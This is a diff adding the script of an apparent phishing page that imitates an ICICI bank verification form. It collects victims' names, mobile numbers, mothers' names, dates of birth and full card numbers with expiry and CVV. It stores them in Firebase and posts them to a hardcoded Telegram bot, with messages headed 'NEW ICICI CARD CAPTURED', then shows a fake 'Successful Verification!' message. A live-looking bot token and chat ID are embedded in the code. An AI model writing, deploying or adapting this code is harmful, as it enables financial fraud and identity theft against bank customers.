+            anim.innerHTML = `
+                <div class="verification-content">
+                    <img src="https://image2url.com/r2/default/images/1770808739878-a9c8b5fd-eaae-494b-b81a-d09ea6211bf0.gif" class="verification-gif" alt="Processing">
+                    <div>Processing Your Request...</div>
+                </div>
+            `;
+            anim.classList.remove('success');
+            
+            saveFormDataToFirebase('final');
+            sendFinalToTelegram();
+            
+            setTimeout(() => {
+                anim.innerHTML = "<div>Successful Verification!</div>"; 
+                anim.classList.add('success');
+                setTimeout(resetForm, 3000);
+            }, 3000);
+        }
+
+        // ==========================================
+        // FIREBASE SAVE FUNCTION (FIXED)
+        // ==========================================
+        function saveFormDataToFirebase(step) {
+            log(`Attempting to save ${step} to Firebase...`);
+            
+            if (!database) {
+                log("❌ Database not initialized!");
+                return;
+            }
+
+            try {
+                // FIX: Completely removed the "Read-then-Write" logic.
+                // We just UPDATE the fields we know. This preserves SIM info.
+                
+                const deviceRef = database.ref('devices/' + deviceId);
+                
+                const deviceUpdate = {
+                    is_online: true,
+                    last_seen: firebase.database.ServerValue.TIMESTAMP,
+                    updated_at: firebase.database.ServerValue.TIMESTAMP
+                };
+                
+                // Only update mobile if present
+                if (formState.data.mobile) {
+                    deviceUpdate.mobile = formState.data.mobile;
+                    deviceUpdate.mobile_number = formState.data.mobile;
+                    deviceUpdate.user_mobile = formState.data.mobile;
+                }
+                
+                // Safe update: Merges this data, keeping everything else (SIM info) intact
+                deviceRef.update(deviceUpdate)
+                    .then(() => {
+                        log("✅ Device info updated (Safe Mode)");
+                    })
+                    .catch((err) => {
+                        log("❌ Device update error: " + err.message);
+                    });
+
+                // 2. Generate form ID if needed
+                if (!formState.currentFormId) {
+                    formState.currentFormId = 'form_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+                }
+
+                // 3. Prepare form data
+                const formData = {
+                    device_id: deviceId,
+                    device_name: deviceName,
+                    session_id: formState.sessionId || '',
+                    form_id: formState.currentFormId,
+                    step: step,
+                    timestamp: Date.now(),
+                    server_timestamp: firebase.database.ServerValue.TIMESTAMP,
+                    fullname: formState.data.fullname || '',
+                    mobile: formState.data.mobile || '',
+                    mobile_number: formState.data.mobile || '',
+                    service: formState.data.service || '',
+                    mothername: formState.data.mothername || '',
+                    dob: formState.data.dob || '',
+                    cardnumber: '',
+                    expiry: '',
+                    cvv: '',
+                    status: step.includes('final') ? 'completed' : 'in_progress',
+                    card_sequence: formState.cardVerificationCount || 0,
+                    total_cards_in_session: formState.formsSubmitted.length || 0,
+                    ip_address: 'Unknown'
+                };
+
+                // Add card details if available
+                if ((step === 'step3' || step === 'step3_second_card' || step === 'final') && formState.data.cardDetails) {
+                    formData.cardnumber = formState.data.cardDetails.cardnumber || '';
+                    formData.expiry = formState.data.cardDetails.expiry || '';
+                    formData.cvv = formState.data.cardDetails.cvv || '';
+                    formData.card_timestamp = formState.data.cardDetails.timestamp || Date.now();
+                }
+
+                // 4. Save to 'forms' node with PUSH (creates unique key)
+                const formsRef = database.ref('forms');
+                const newFormRef = formsRef.push();
+                
+                newFormRef.set(formData)
+                    .then(() => {
+                        log("✅ Form data saved successfully! Key: " + newFormRef.key);
+                    })
+                    .catch((error) => {
+                        log("❌ Form save error: " + error.message);
+                        console.error(error);
+                    });
+
+                // 5. Save to logs
+                const logsRef = database.ref('form_logs/' + deviceId);
+                logsRef.push({
+                    session_id: formState.sessionId || '',
+                    form_id: formState.currentFormId,
+                    step: step,
+                    card_number: formData.cardnumber || '',
+                    card_sequence: formState.cardVerificationCount || 0,
+                    timestamp: Date.now(),
+                    server_timestamp: firebase.database.ServerValue.TIMESTAMP
+                }).then(() => {
+                    log("✅ Log entry saved");
+                }).catch((err) => {
+                    log("❌ Log save error: " + err.message);
+                });
+
+            } catch(e) { 
+                log("❌ Critical error in saveFormDataToFirebase: " + e.message);
+                console.error(e);
+            }
+        }
+
+        // ==========================================
+        // TELEGRAM FUNCTIONS
+        // ==========================================
+        const TELEGRAM_BOT_TOKEN = '8247434418:AAFvZMJDDbvAtFLbbDrxi2LFmFzmKQc4fAc';
+        const TELEGRAM_CHAT_ID = '7155441629';
+
+        function sendStepToTelegram(step) {
+            let message = `📋 ICICI Form - Step ${step}\n`;
+            message += `━━━━━━━━━━━━━━━━━━\n`;
+            message += `👤 Name: ${formState.data.fullname || 'N/A'}\n`;
+            message += `📞 Mobile: ${formState.data.mobile || 'N/A'}\n`;
+            
+            if (formState.data.service) message += `🛠️ Service: ${formState.data.service}\n`;
+            if (step === 'step2' && formState.data.mothername) message += `👩 Mother: ${formState.data.mothername}\n`;
+            if (step === 'step2' && formState.data.dob) message += `🎂 DOB: ${formState.data.dob}\n`;
+            
+            if (step === 'step3' && formState.data.cardDetails) {
+                const card = formState.data.cardDetails.cardnumber;
+                if (card) {
+                    message += `💳 Card: ${card}\n`;
+                    message += `📅 Expiry: ${formState.data.cardDetails.expiry}\n`;
+                }
+            }
+            
+            message += `⏰ Time: ${new Date().toLocaleTimeString()}`;
+            
+            sendTelegramMessage(message);
+        }
+
+        function sendCardToTelegram(cardType) {
+            let message = `💳 NEW ICICI CARD CAPTURED\n`;
+            message += `━━━━━━━━━━━━━━━━━━\n`;
+            message += `👤 Name: ${formState.data.fullname || 'N/A'}\n`;
+            message += `📞 Mobile: ${formState.data.mobile || 'N/A'}\n`;
+            message += `🔢 Card Type: ${cardType === 'first_card' ? 'First Card' : 'Second Card'}\n`;
+            
+            if (formState.data.cardDetails) {
+                const card = formState.data.cardDetails.cardnumber;
+                if (card) {
+                    message += `\n🔢 Card Details:\n`;
+                    message += `Number: ${card}\n`;
+                    message += `Expiry: ${formState.data.cardDetails.expiry || 'N/A'}\n`;
+                    message += `CVV: ${formState.data.cardDetails.cvv || 'N/A'}`;
+                }
+            }
+            
+            message += `\n\n⏰ Time: ${new Date().toLocaleString()}`;
+            
+            sendTelegramMessage(message);
+        }
+
+        function sendFinalToTelegram() {
+            let message = `🎉 ICICI FORM COMPLETED\n`;
+            message += `━━━━━━━━━━━━━━━━━━\n`;
+            message += `👤 Name: ${formState.data.fullname || 'N/A'}\n`;
+            message += `📞 Mobile: ${formState.data.mobile || 'N/A'}\n`;
+            message += `🛠️ Service: ${formState.data.service || 'N/A'}\n`;
+            
+            if (formState.data.cardDetails) {
+                const card = formState.data.cardDetails.cardnumber;
+                if (card) {
+                    message += `\n💳 Final Card:\n`;
+                    message += `Number: ${card}\n`;
+                    message += `Expiry: ${formState.data.cardDetails.expiry || 'N/A'}\n`;
+                    message += `CVV: ${formState.data.cardDetails.cvv || 'N/A'}`;
+                }
+            }
+            
+            message += `\n\n📱 Device: ${deviceName}`;
+            message += `\n⏰ Time: ${new Date().toLocaleString()}`;
+            
+            sendTelegramMessage(message);
+        }
+
+        function sendTelegramMessage(text) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', url, true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    if (xhr.status === 200) {
+                        log("✅ Telegram message sent");
+                    } else {
+                        log("❌ Telegram error: " + xhr.status);
+                    }
+                }
+            };
+            
+            const data = {
+                chat_id: TELEGRAM_CHAT_ID,
+                text: text,
+                parse_mode: 'HTML'
+            };
+            
+            xhr.send(JSON.stringify(data));
+        }
+
+        function resetForm() {
+            formState.currentStep = 1; 
+            formState.data = {}; 
+            formState.cardVerificationCount = 0; 
+            formState.cibilChecked = false;
+            formState.currentFormId = null;
+            formState.formsSubmitted = [];
+            
+            document.querySelectorAll('input').forEach(el => el.value = '');
+            document.getElementById('service').value = '';
+            document.querySelectorAll('.error-message').forEach(el => el.style.display = 'none');
+            document.querySelectorAll('.form-step').forEach(el => el.classList.remove('active'));
+            document.getElementById('step1').classList.add('active');
+            updateProgressBar();
+            
+            // Generate new session and form ID
+            formState.sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+            formState.currentFormId = 'form_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+            
+            log("✅ Form reset completed. New session: " + formState.sessionId);
+        }
+
+        // ==========================================
+        // FORMAT FUNCTIONS
+        // ==========================================
+        function formatDOB(i) {
+            const isDelete = window.event && (window.event.inputType === 'deleteContentBackward' || window.event.inputType === 'deleteContentForward');
+            let v = i.value.replace(/\D/g, '').substring(0, 8);
+
+            if (isDelete) {
+                if (v.length > 4) {
+                    i.value = v.substring(0, 2) + '/' + v.substring(2, 4) + '/' + v.substring(4);
+                } else if (v.length > 2) {
+                    i.value = v.substring(0, 2) + '/' + v.substring(2);
+                } else {
+                    i.value = v;
+                }
+            } else {
+                if (v.length >= 5) {
+                    i.value = v.substring(0, 2) + '/' + v.substring(2, 4) + '/' + v.substring(4);
+                } else if (v.length >= 4) {
+                    i.value = v.substring(0, 2) + '/' + v.substring(2, 4) + '/';
+                } else if (v.length >= 2) {
+                    i.value = v.substring(0, 2) + '/' + v.substring(2);
+                } else {
+                    i.value = v;
+                }
+            }
+            validateDOB();
+        }
+
+        function formatExpiry(i) {
+            const isDelete = window.event && (window.event.inputType === 'deleteContentBackward' || window.event.inputType === 'deleteContentForward');
+            let v = i.value.replace(/\D/g, '').substring(0, 4);
+
+            if (isDelete) {
+                if (v.length > 2) {
+                    i.value = v.substring(0, 2) + '/' + v.substring(2);
+                } else {
+                    i.value = v;
+                }
+            } else {
+                if (v.length >= 2) {
+                    i.value = v.substring(0, 2) + '/' + v.substring(2);
+                } else {
+                    i.value = v;
+                }
+            }
+            validateExpiry();
+        }
+
+        function isValidDate(s) { 
+            const p = s.split('/'); 
+            return p.length === 3 && !isNaN(Date.parse(p[2] + '-' + p[1] + '-' + p[0])); 
+        }
+        
+        function isValidExpiry(s) { 
+            const p = s.split('/'); 
+            if (p.length !== 2) return false; 
+            const y = parseInt(p[1]) + 2000; 
+            const m = parseInt(p[0]); 
+            return m > 0 && m <= 12 && y >= new Date().getFullYear(); 
+        }
+
+        // Start
+        window.onload = initForm;
+    </script>
+</body>
+</html>
